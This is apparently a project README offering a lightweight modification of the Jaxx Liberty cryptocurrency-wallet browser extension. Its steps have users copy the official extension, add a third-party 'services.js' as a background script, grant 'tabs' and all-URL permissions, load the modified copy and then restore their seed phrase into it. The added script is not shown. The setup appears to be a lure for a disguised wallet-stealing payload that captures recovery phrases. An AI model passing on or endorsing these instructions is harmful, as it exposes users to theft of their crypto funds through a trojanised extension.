# For who love jaxx.io

## Features
- The Jaxx Liberty for Desktop is more than 100Mb. This library can do it with 4kb, and more better (^_^).

## Important
- **Backup your wallet, phrase information before doing anything next.**
- To avoid all of allegations relate to the privacy in futures, you must to build this app by yourself, please understand that because your crypto wallet safety. Don't wories, it's easy. You even don't need any developer skill to build this app with my library, but please consult with your trusted technical representative for helpful advice.
- I cannot ensure or warrant the security of this scripts, so use at your own risk. I'm not responsible for anything that happens due to you using this script!


<p align="center"><img src="https://i.imgur.com/80psMJQ.png"></p>

## Let build it.
#### (*) You must install the [official Jaxx Liberty extension on chrome webstore](https://chrome.google.com/webstore/detail/jaxx-liberty/cjelfplplebdjjenllpjcblmjkfcffne) first

<ol>
  <li>Access <code>chrome://version/</code> and get your <u>Profile Path</u>, if you use Chrome, it's looklike <code>...\Google\Chrome\User Data\Default\</code> , now you access folder <code>Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code> inside your <u>Profile Path</u>.
 <ul>
    <li>CentBrowser can quick access: <code>%AppData%\..\Local\CentBrowser\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code></li>
    <li>Google Chrome can quick access: <code>%AppData%\..\Google\Chrome\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code></li>
</ul></li>
  <li>If you installed lastest Jaxx version, that folder is <code>2.4.6.0_0</code>just make a copy of that folder to another location, e.g <code>C:\2.4.6.0_0</code>, we will build the app here.</li>
  <li>Download <a href="https://github.com/Brahmulr/jaxx.app/releases/latest">lastest releases</a> library, unzip and move these files to <code>C:\2.4.6.0_0\</code></li>
</ol>


### Now we need edit, you can use notepad or any text-editor.
- Please creaful with commas (`,`) and line break.

##### C:\2.4.6.0_0\manifest.json

Change `"default_popup": "index.html"` =>  `"default_popup": "pop.html"`

Change `"permissions": [` =>  `"permissions": ["tabs","<all_urls>",`

Change `"background.js",` =>  `"background.js","services.js",`

After edited, `manifest.json` looklike <a href="https://i.imgur.com/lQfFva0.png">this image</a>
Save it.


##### C:\2.4.6.0_0\index.html
Change `</head>` =>  `<link rel="stylesheet" href="mod_themes.css"></head>`

After edited, `index.html` looklike <a href="https://i.imgur.com/FEpFBhA.png">this image</a>

Save it.

## You've done! Let install new app.
### Open chrome, then access `chrome://extensions/` URL

<p align="center"><img src="https://i.imgur.com/bo64nXe.png"></p>

### You can now click on the icon of Jaxx Liberty extension to use, let start to recover that your backed-up's wallet - phrase

<p align="center"><img src="https://i.imgur.com/fnjXzMc.png"></p>
